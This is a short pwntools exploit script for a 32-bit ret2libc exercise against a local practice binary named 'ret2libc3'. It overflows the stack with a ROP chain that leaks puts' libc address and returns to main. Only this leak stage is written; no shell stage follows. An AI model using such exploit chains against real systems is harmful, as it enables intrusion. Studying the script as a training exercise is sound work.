#Made by fly_autumn
#ret2libc x86
from pwn import *
p = process("./ret2libc3")
elf = ELF("./ret2libc3")
libc = ELF("/lib/i386-linux-gnu/libc.so.6")

offset = 112
puts_plt = elf.plt["puts"]
puts_got = elf.got["puts"]
main_plt = 0x8048490
payload = b"\x00" * offset + p32(puts_plt) + p32(main_plt) + p32(puts_got)
p.sendline(payload)

p.interactive()
